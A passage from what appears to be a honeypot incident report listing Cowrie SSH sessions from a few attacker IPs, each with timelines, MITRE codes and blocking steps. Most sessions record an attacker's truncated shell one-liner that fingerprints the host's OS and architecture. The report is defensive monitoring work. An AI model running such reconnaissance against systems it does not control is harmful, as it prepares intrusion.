| `2026-07-06 06:06:44` | `cowrie.command.input` |
| `2026-07-06 06:06:44` | `cowrie.command.input` |
| `2026-07-06 06:06:44` | `cowrie.command.input` |
| `2026-07-06 06:06:44` | `cowrie.command.input` |
| `2026-07-06 06:06:44` | `cowrie.command.input` |
| `2026-07-06 06:06:44` | `cowrie.command.success` |
| `2026-07-06 06:06:44` | `cowrie.command.input` |
| `2026-07-06 06:06:44` | `cowrie.command.input` |
| `2026-07-06 06:06:44` | `cowrie.command.input` |
| `2026-07-06 06:06:44` | `cowrie.command.input` |
| `2026-07-06 06:06:45` | `cowrie.log.closed` |
| `2026-07-06 06:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc6378729abb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:07 |
| **Last Seen** | 2026-07-06 06:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:07:23` | `cowrie.session.connect` |
| `2026-07-06 06:07:23` | `cowrie.client.version` |
| `2026-07-06 06:07:23` | `cowrie.client.kex` |
| `2026-07-06 06:07:26` | `cowrie.login.success` |
| `2026-07-06 06:07:28` | `cowrie.session.params` |
| `2026-07-06 06:07:28` | `cowrie.command.input` |
| `2026-07-06 06:07:28` | `cowrie.command.input` |
| `2026-07-06 06:07:28` | `cowrie.command.input` |
| `2026-07-06 06:07:28` | `cowrie.command.input` |
| `2026-07-06 06:07:28` | `cowrie.command.input` |
| `2026-07-06 06:07:28` | `cowrie.command.success` |
| `2026-07-06 06:07:28` | `cowrie.command.input` |
| `2026-07-06 06:07:28` | `cowrie.command.input` |
| `2026-07-06 06:07:28` | `cowrie.command.input` |
| `2026-07-06 06:07:28` | `cowrie.command.input` |
| `2026-07-06 06:07:28` | `cowrie.log.closed` |
| `2026-07-06 06:07:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3bd7e675f14

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:08 |
| **Last Seen** | 2026-07-06 06:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:08:06` | `cowrie.session.connect` |
| `2026-07-06 06:08:07` | `cowrie.client.version` |
| `2026-07-06 06:08:07` | `cowrie.client.kex` |
| `2026-07-06 06:08:09` | `cowrie.login.success` |
| `2026-07-06 06:08:11` | `cowrie.session.params` |
| `2026-07-06 06:08:11` | `cowrie.command.input` |
| `2026-07-06 06:08:11` | `cowrie.command.input` |
| `2026-07-06 06:08:11` | `cowrie.command.input` |
| `2026-07-06 06:08:11` | `cowrie.command.input` |
| `2026-07-06 06:08:11` | `cowrie.command.input` |
| `2026-07-06 06:08:11` | `cowrie.command.success` |
| `2026-07-06 06:08:11` | `cowrie.command.input` |
| `2026-07-06 06:08:11` | `cowrie.command.input` |
| `2026-07-06 06:08:11` | `cowrie.command.input` |
| `2026-07-06 06:08:11` | `cowrie.command.input` |
| `2026-07-06 06:08:12` | `cowrie.log.closed` |
| `2026-07-06 06:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff5e7e03382f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 06:08 |
| **Last Seen** | 2026-07-06 06:08 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:08:23` | `cowrie.session.connect` |
| `2026-07-06 06:08:24` | `cowrie.client.version` |
| `2026-07-06 06:08:24` | `cowrie.client.kex` |
| `2026-07-06 06:08:31` | `cowrie.login.success` |
| `2026-07-06 06:08:35` | `cowrie.session.params` |
| `2026-07-06 06:08:35` | `cowrie.command.input` |
| `2026-07-06 06:08:36` | `cowrie.log.closed` |
| `2026-07-06 06:08:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c1a1523a846

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:08 |
| **Last Seen** | 2026-07-06 06:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:08:50` | `cowrie.session.connect` |
| `2026-07-06 06:08:51` | `cowrie.client.version` |
| `2026-07-06 06:08:51` | `cowrie.client.kex` |
| `2026-07-06 06:08:53` | `cowrie.login.success` |
| `2026-07-06 06:08:55` | `cowrie.session.params` |
| `2026-07-06 06:08:55` | `cowrie.command.input` |
| `2026-07-06 06:08:55` | `cowrie.command.input` |
| `2026-07-06 06:08:55` | `cowrie.command.input` |
| `2026-07-06 06:08:55` | `cowrie.command.input` |
| `2026-07-06 06:08:55` | `cowrie.command.input` |
| `2026-07-06 06:08:55` | `cowrie.command.success` |
| `2026-07-06 06:08:55` | `cowrie.command.input` |
| `2026-07-06 06:08:55` | `cowrie.command.input` |
| `2026-07-06 06:08:55` | `cowrie.command.input` |
| `2026-07-06 06:08:55` | `cowrie.command.input` |
| `2026-07-06 06:08:56` | `cowrie.log.closed` |
| `2026-07-06 06:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d71edb7c8d7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:09 |
| **Last Seen** | 2026-07-06 06:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:09:34` | `cowrie.session.connect` |
| `2026-07-06 06:09:35` | `cowrie.client.version` |
| `2026-07-06 06:09:35` | `cowrie.client.kex` |
| `2026-07-06 06:09:38` | `cowrie.login.success` |
| `2026-07-06 06:09:39` | `cowrie.session.params` |
| `2026-07-06 06:09:39` | `cowrie.command.input` |
| `2026-07-06 06:09:39` | `cowrie.command.input` |
| `2026-07-06 06:09:39` | `cowrie.command.input` |
| `2026-07-06 06:09:39` | `cowrie.command.input` |
| `2026-07-06 06:09:39` | `cowrie.command.input` |
| `2026-07-06 06:09:39` | `cowrie.command.success` |
| `2026-07-06 06:09:39` | `cowrie.command.input` |
| `2026-07-06 06:09:39` | `cowrie.command.input` |
| `2026-07-06 06:09:39` | `cowrie.command.input` |
| `2026-07-06 06:09:39` | `cowrie.command.input` |
| `2026-07-06 06:09:40` | `cowrie.log.closed` |
| `2026-07-06 06:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40f449f7a11d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:10 |
| **Last Seen** | 2026-07-06 06:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:10:18` | `cowrie.session.connect` |
| `2026-07-06 06:10:19` | `cowrie.client.version` |
| `2026-07-06 06:10:19` | `cowrie.client.kex` |
| `2026-07-06 06:10:21` | `cowrie.login.success` |
| `2026-07-06 06:10:23` | `cowrie.session.params` |
| `2026-07-06 06:10:23` | `cowrie.command.input` |
| `2026-07-06 06:10:23` | `cowrie.command.input` |
| `2026-07-06 06:10:23` | `cowrie.command.input` |
| `2026-07-06 06:10:23` | `cowrie.command.input` |
| `2026-07-06 06:10:23` | `cowrie.command.input` |
| `2026-07-06 06:10:23` | `cowrie.command.success` |
| `2026-07-06 06:10:23` | `cowrie.command.input` |
| `2026-07-06 06:10:23` | `cowrie.command.input` |
| `2026-07-06 06:10:23` | `cowrie.command.input` |
| `2026-07-06 06:10:23` | `cowrie.command.input` |
| `2026-07-06 06:10:24` | `cowrie.log.closed` |
| `2026-07-06 06:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f2350771cf9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:11 |
| **Last Seen** | 2026-07-06 06:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:11:02` | `cowrie.session.connect` |
| `2026-07-06 06:11:02` | `cowrie.client.version` |
| `2026-07-06 06:11:02` | `cowrie.client.kex` |
| `2026-07-06 06:11:05` | `cowrie.login.success` |
| `2026-07-06 06:11:07` | `cowrie.session.params` |
| `2026-07-06 06:11:07` | `cowrie.command.input` |
| `2026-07-06 06:11:07` | `cowrie.command.input` |
| `2026-07-06 06:11:07` | `cowrie.command.input` |
| `2026-07-06 06:11:07` | `cowrie.command.input` |
| `2026-07-06 06:11:07` | `cowrie.command.input` |
| `2026-07-06 06:11:07` | `cowrie.command.success` |
| `2026-07-06 06:11:07` | `cowrie.command.input` |
| `2026-07-06 06:11:07` | `cowrie.command.input` |
| `2026-07-06 06:11:07` | `cowrie.command.input` |
| `2026-07-06 06:11:07` | `cowrie.command.input` |
| `2026-07-06 06:11:07` | `cowrie.log.closed` |
| `2026-07-06 06:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d20590acf999

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:11 |
| **Last Seen** | 2026-07-06 06:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:11:44` | `cowrie.session.connect` |
| `2026-07-06 06:11:45` | `cowrie.client.version` |
| `2026-07-06 06:11:45` | `cowrie.client.kex` |
| `2026-07-06 06:11:47` | `cowrie.login.success` |
| `2026-07-06 06:11:49` | `cowrie.session.params` |
| `2026-07-06 06:11:49` | `cowrie.command.input` |
| `2026-07-06 06:11:49` | `cowrie.command.input` |
| `2026-07-06 06:11:49` | `cowrie.command.input` |
| `2026-07-06 06:11:49` | `cowrie.command.input` |
| `2026-07-06 06:11:49` | `cowrie.command.input` |
| `2026-07-06 06:11:49` | `cowrie.command.success` |
| `2026-07-06 06:11:49` | `cowrie.command.input` |
| `2026-07-06 06:11:49` | `cowrie.command.input` |
| `2026-07-06 06:11:49` | `cowrie.command.input` |
| `2026-07-06 06:11:49` | `cowrie.command.input` |
| `2026-07-06 06:11:50` | `cowrie.log.closed` |
| `2026-07-06 06:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16c1f610363f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:12 |
| **Last Seen** | 2026-07-06 06:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:12:27` | `cowrie.session.connect` |
| `2026-07-06 06:12:27` | `cowrie.client.version` |
| `2026-07-06 06:12:27` | `cowrie.client.kex` |
| `2026-07-06 06:12:30` | `cowrie.login.success` |
| `2026-07-06 06:12:32` | `cowrie.session.params` |
| `2026-07-06 06:12:32` | `cowrie.command.input` |
| `2026-07-06 06:12:32` | `cowrie.command.input` |
| `2026-07-06 06:12:32` | `cowrie.command.input` |
| `2026-07-06 06:12:32` | `cowrie.command.input` |
| `2026-07-06 06:12:32` | `cowrie.command.input` |
| `2026-07-06 06:12:32` | `cowrie.command.success` |
| `2026-07-06 06:12:32` | `cowrie.command.input` |
| `2026-07-06 06:12:32` | `cowrie.command.input` |
| `2026-07-06 06:12:32` | `cowrie.command.input` |
| `2026-07-06 06:12:32` | `cowrie.command.input` |
| `2026-07-06 06:12:33` | `cowrie.log.closed` |
| `2026-07-06 06:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c3f61faa174

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:13 |
| **Last Seen** | 2026-07-06 06:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:13:09` | `cowrie.session.connect` |
| `2026-07-06 06:13:10` | `cowrie.client.version` |
| `2026-07-06 06:13:10` | `cowrie.client.kex` |
| `2026-07-06 06:13:12` | `cowrie.login.success` |
| `2026-07-06 06:13:14` | `cowrie.session.params` |
| `2026-07-06 06:13:14` | `cowrie.command.input` |
| `2026-07-06 06:13:14` | `cowrie.command.input` |
| `2026-07-06 06:13:14` | `cowrie.command.input` |
| `2026-07-06 06:13:14` | `cowrie.command.input` |
| `2026-07-06 06:13:14` | `cowrie.command.input` |
| `2026-07-06 06:13:14` | `cowrie.command.success` |
| `2026-07-06 06:13:14` | `cowrie.command.input` |
| `2026-07-06 06:13:14` | `cowrie.command.input` |
| `2026-07-06 06:13:14` | `cowrie.command.input` |
| `2026-07-06 06:13:14` | `cowrie.command.input` |
| `2026-07-06 06:13:15` | `cowrie.log.closed` |
| `2026-07-06 06:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09f2e092b156

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:13 |
| **Last Seen** | 2026-07-06 06:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:13:52` | `cowrie.session.connect` |
| `2026-07-06 06:13:52` | `cowrie.client.version` |
| `2026-07-06 06:13:52` | `cowrie.client.kex` |
| `2026-07-06 06:13:55` | `cowrie.login.success` |
| `2026-07-06 06:13:57` | `cowrie.session.params` |
| `2026-07-06 06:13:57` | `cowrie.command.input` |
| `2026-07-06 06:13:57` | `cowrie.command.input` |
| `2026-07-06 06:13:57` | `cowrie.command.input` |
| `2026-07-06 06:13:57` | `cowrie.command.input` |
| `2026-07-06 06:13:57` | `cowrie.command.input` |
| `2026-07-06 06:13:57` | `cowrie.command.success` |
| `2026-07-06 06:13:57` | `cowrie.command.input` |
| `2026-07-06 06:13:57` | `cowrie.command.input` |
| `2026-07-06 06:13:57` | `cowrie.command.input` |
| `2026-07-06 06:13:57` | `cowrie.command.input` |
| `2026-07-06 06:13:57` | `cowrie.log.closed` |
| `2026-07-06 06:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69d4b84446e6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:14 |
| **Last Seen** | 2026-07-06 06:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:14:35` | `cowrie.session.connect` |
| `2026-07-06 06:14:35` | `cowrie.client.version` |
| `2026-07-06 06:14:35` | `cowrie.client.kex` |
| `2026-07-06 06:14:38` | `cowrie.login.success` |
| `2026-07-06 06:14:40` | `cowrie.session.params` |
| `2026-07-06 06:14:40` | `cowrie.command.input` |
| `2026-07-06 06:14:40` | `cowrie.command.input` |
| `2026-07-06 06:14:40` | `cowrie.command.input` |
| `2026-07-06 06:14:40` | `cowrie.command.input` |
| `2026-07-06 06:14:40` | `cowrie.command.input` |
| `2026-07-06 06:14:40` | `cowrie.command.success` |
| `2026-07-06 06:14:40` | `cowrie.command.input` |
| `2026-07-06 06:14:40` | `cowrie.command.input` |
| `2026-07-06 06:14:40` | `cowrie.command.input` |
| `2026-07-06 06:14:40` | `cowrie.command.input` |
| `2026-07-06 06:14:40` | `cowrie.log.closed` |
| `2026-07-06 06:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fd6a6f836f3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:15 |
| **Last Seen** | 2026-07-06 06:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
